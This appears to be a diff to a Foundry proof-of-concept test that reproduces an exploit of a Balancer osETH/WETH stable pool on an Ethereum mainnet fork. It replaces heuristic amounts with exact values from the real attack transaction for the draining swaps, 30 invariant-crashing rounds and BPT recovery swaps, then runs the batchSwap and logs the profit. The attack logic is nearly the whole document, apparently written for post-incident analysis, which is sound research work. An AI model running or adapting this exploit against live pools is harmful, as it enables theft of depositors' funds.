@@ -17,7 +17,7 @@ contract BalancerPoc is Test {
     IVault constant VAULT = IVault(address(0xBA12222222228d8Ba445958a75a0704d566BF2C8));
 
     function setUp() public {
-        vm.createSelectFork("ETH", 23717395);
+        vm.createSelectFork("ETH", 23717396); // one block before attack tx in block 23717397
         swapMath = new SwapMath();
 
         vm.label(address(OSETH_BPT), "OSETH_BPT");
@@ -28,27 +28,67 @@ contract BalancerPoc is Test {
         // payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)).call{value: 400081 ether}("");
     }
 
-    function generateStep1Amounts(uint256 balances, uint256 swapFee, uint256 targetRemain, uint256 maxLength)
+    function generateStep1Amounts(uint256 balance, uint256 targetRemain, uint256 maxLength)
         internal
         pure
         returns (uint256 remainAmount, uint256 stepLength, uint256[] memory swapAmounts)
     {
-        remainAmount = balances;
-        uint256 remainAllactionFactor = FixedPoint.ONE - swapFee;
         swapAmounts = new uint256[](maxLength);
-        for (uint256 i = 0; i < maxLength; i++) {
-            uint256 swapAmount = (remainAmount - targetRemain) * remainAllactionFactor / FixedPoint.ONE;
-            if (swapAmount == 0) {
-                break;
-            }
-            stepLength++;
-            swapAmounts[i] = swapAmount;
-            remainAmount -= swapAmount;
+        remainAmount = balance;
 
-            if (remainAmount <= targetRemain) {
+        // Real attack formula: each step takes (remaining - target) * 99 / 100
+        for (uint256 i = 0; i < maxLength; i++) {
+            if (remainAmount <= targetRemain) break;
+
+            uint256 excess = remainAmount - targetRemain;
+            uint256 amount = excess * 99 / 100;
+
+            if (amount == 0) {
+                // Cleanup: drain the full remaining excess
+                swapAmounts[i] = excess;
+                remainAmount = targetRemain;
+                stepLength++;
                 break;
             }
+
+            swapAmounts[i] = amount;
+            remainAmount -= amount;
+            stepLength++;
         }
+    }
+
+    function getStep2ExtractAmounts() internal pure returns (uint256[] memory amounts) {
+        amounts = new uint256[](30);
+        amounts[0] = 891000;
+        amounts[1] = 666000;
+        amounts[2] = 495000;
+        amounts[3] = 369000;
+        amounts[4] = 270000;
+        amounts[5] = 198000;
+        amounts[6] = 160000;
+        amounts[7] = 120000;
+        amounts[8] = 89100;
+        amounts[9] = 67500;
+        amounts[10] = 52200;
+        amounts[11] = 40500;
+        amounts[12] = 31500;
+        amounts[13] = 24300;
+        amounts[14] = 19800;
+        amounts[15] = 16200;
+        amounts[16] = 12600;
+        amounts[17] = 10800;
+        amounts[18] = 9000;
+        amounts[19] = 7371;
+        amounts[20] = 6480;
+        amounts[21] = 6075;
+        amounts[22] = 5589;
+        amounts[23] = 4779;
+        amounts[24] = 4455;
+        amounts[25] = 3969;
+        amounts[26] = 3726;
+        amounts[27] = 3645;
+        amounts[28] = 3564;
+        amounts[29] = 3564;
     }
 
     function insertStep2Swaps(
@@ -64,9 +104,11 @@ contract BalancerPoc is Test {
         uint256[] memory scalingFactors,
         IVault.BatchSwapStep[] memory swaps
     ) internal view {
-        while (swapCountLimit > 0) {
+        uint256[] memory extractAmounts = getStep2ExtractAmounts();
+
+        for (uint256 round = 0; round < swapCountLimit; round++) {
             {
-                // Step 1: targetIndex balance to targetBalance + 1
+                // Swap 1: drain targetIndex to targetBalance + 1
                 uint256 swapOutAmount = balances[targetIndex] - targetBalance - 1;
 
                 balances = swapMath.getAfterSwapOutBalances(
@@ -81,7 +123,7 @@ contract BalancerPoc is Test {
                 if (balances[targetIndex] != targetBalance + 1) {
                     revert("insertStep2Swaps failed");
                 }
-                // Step 2: targetIndex balance to 1
+                // Swap 2: drain remaining targetBalance
                 uint256 swapOutAmount = targetBalance;
                 balances = swapMath.getAfterSwapOutBalances(
                     balances, scalingFactors, otherIndex, targetIndex, swapOutAmount, amp, swapFeePercentage
@@ -90,42 +132,21 @@ contract BalancerPoc is Test {
                     poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: swapOutAmount, userData: ""
                 });
 
-                console.log("Step2 After WETH balance: ", balances[otherIndex]);
-                console.log("Step2 After osETH balance: ", balances[targetIndex]);
+                console.log("Step2 Round WETH:", balances[otherIndex], "osETH:", balances[targetIndex]);
             }
             {
-                // Step3: Recover otherIndex balance
-                uint256 swapOutAmount = balances[otherIndex] * 999 / 1000;
-                // May be error, if error need adjust swapOutAmount
-                try swapMath.getAfterSwapOutBalances(
+                // Swap 3: use real attack's exact extraction amounts
+                uint256 swapOutAmount = extractAmounts[round];
+
+                balances = swapMath.getAfterSwapOutBalances(
                     balances, scalingFactors, targetIndex, otherIndex, swapOutAmount, amp, swapFeePercentage
-                ) returns (
-                    uint256[] memory newBalances
-                ) {
-                    balances = newBalances;
-                } catch {
-                    // Adjust swapOutAmount
-                    while (true) {
-                        swapOutAmount = swapOutAmount * 9 / 10;
-                        try swapMath.getAfterSwapOutBalances(
-                            balances, scalingFactors, targetIndex, otherIndex, swapOutAmount, amp, swapFeePercentage
-                        ) returns (
-                            uint256[] memory newBalances
-                        ) {
-                            balances = newBalances;
-                            break;
-                        } catch {
-                            continue;
-                        }
-                    }
-                }
+                );
 
                 swaps[swapsIndex + 3] = IVault.BatchSwapStep({
                     poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: swapOutAmount, userData: ""
                 });
             }
 
-            swapCountLimit--;
             swapsIndex += 3;
         }
     }
@@ -145,12 +166,13 @@ contract BalancerPoc is Test {
                 accumulated += 1000 * nowValue;
                 nowValue = nowValue * 1000;
                 swapAmounts[i] = nowValue;
-                // console.log("IF swapAmounts[", i, "] =", swapAmounts[i]);
                 stepLength++;
             } else {
+                // Split remainder into 2 equal parts (matching real attack pattern)
                 uint256 remain = balances - accumulated;
-                swapAmounts[i] = remain;
-                stepLength++;
+                swapAmounts[i] = remain / 2;
+                swapAmounts[i + 1] = remain / 2;
+                stepLength += 2;
 
                 console.log("Step Length: ", stepLength);
                 break;
@@ -200,18 +222,30 @@ contract BalancerPoc is Test {
         (uint256 amp,,) = OSETH_BPT.getAmplificationParameter();
         uint256 bptRate = OSETH_BPT.getRate();
 
-        uint256 targetRemainBalance = 87000;
+        uint256 targetRemainBalance = 67000;
 
         (uint256 remainETHAmount, uint256 stepETHLength, uint256[] memory stepETHAmount) =
-            generateStep1Amounts(balances[0], swapFeePercentage, targetRemainBalance, 10);
+            generateStep1Amounts(balances[0], targetRemainBalance, 15);
         (uint256 remainOSETHAmount, uint256 stepOSETHLength, uint256[] memory stepOSETHAmount) =
-            generateStep1Amounts(balances[2], swapFeePercentage, targetRemainBalance, 10);
+            generateStep1Amounts(balances[2], targetRemainBalance, 15);
 
         uint256 bptActualBalances = OSETH_BPT.getActualSupply();
+        uint256 bptTotalSupply = IERC20(address(OSETH_BPT)).totalSupply();
         console.log("Actual supply:", bptActualBalances);
+        console.log("Total supply:", bptTotalSupply);
 
-        (uint256[] memory stepBPTAmount, uint256 stepBPTLength) =
-            generateStep3Amounts(bptActualBalances * bptRate / 1e18, 10);
+        // Use exact Step 3 BPT amounts from real attack transaction
+        uint256 stepBPTLength = 8; // 9 swaps total, but stepBPTLength is used as (length-1) for loop
+        uint256[] memory stepBPTAmount = new uint256[](9);
+        stepBPTAmount[0] = 10000;
+        stepBPTAmount[1] = 10000000;
+        stepBPTAmount[2] = 10000000000;
+        stepBPTAmount[3] = 10000000000000;
+        stepBPTAmount[4] = 10000000000000000;
+        stepBPTAmount[5] = 10000000000000000000;
+        stepBPTAmount[6] = 10000000000000000000000;
+        stepBPTAmount[7] = 941319322493191942754;
+        stepBPTAmount[8] = 941319322493191942754;
 
         int256[] memory limits = new int256[](3);
         limits[0] = int256(1809251394333065553493296640760748560207343510400633813116524750123642650624);
@@ -222,7 +256,7 @@ contract BalancerPoc is Test {
             sender: address(this), fromInternalBalance: true, recipient: payable(address(this)), toInternalBalance: true
         });
 
-        uint256 step2SwapCount = 40;
+        uint256 step2SwapCount = 30; // Real attack uses 30 D-crash rounds
         IVault.BatchSwapStep[] memory swaps =
             new IVault.BatchSwapStep[](stepETHLength + stepOSETHLength + stepBPTLength + 1 + step2SwapCount * 3);
 
@@ -272,7 +306,44 @@ contract BalancerPoc is Test {
             }
         }
 
-        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, swaps, tokens, funds, limits, block.timestamp + 1);
-        // OSETH_BPT.updateTokenRateCache()
+        // Compute recovery total for logging
+        uint256 recoveryTarget = 0;
+        for (uint256 i = 0; i < stepBPTLength + 1; i++) {
+            recoveryTarget += stepBPTAmount[i];
+        }
+        console.log("=== KEY METRICS ===");
+        console.log("BPT actual supply:", bptActualBalances);
+        console.log("BPT rate:", bptRate);
+        console.log("Recovery target (Step3 total BPT):", recoveryTarget);
+        console.log("Recovery / supply ratio (basis points):", recoveryTarget * 10000 / bptActualBalances);
+
+        int256[] memory deltas = VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, swaps, tokens, funds, limits, block.timestamp + 1);
+
+        console.log("=== BATCH SWAP DELTAS ===");
+        console.log("WETH delta (positive=owe, negative=receive):");
+        if (deltas[0] >= 0) {
+            console.log("  +", uint256(deltas[0]));
+        } else {
+            console.log("  -", uint256(-deltas[0]));
+        }
+        console.log("BPT delta:");
+        if (deltas[1] >= 0) {
+            console.log("  +", uint256(deltas[1]));
+        } else {
+            console.log("  -", uint256(-deltas[1]));
+        }
+        console.log("osETH delta:");
+        if (deltas[2] >= 0) {
+            console.log("  +", uint256(deltas[2]));
+        } else {
+            console.log("  -", uint256(-deltas[2]));
+        }
+
+        // Express BPT delta as ratio of supply
+        if (deltas[1] >= 0) {
+            console.log("BPT net cost / supply (basis points):", uint256(deltas[1]) * 10000 / bptActualBalances);
+        } else {
+            console.log("BPT net SURPLUS / supply (basis points):", uint256(-deltas[1]) * 10000 / bptActualBalances);
+        }
     }
 }
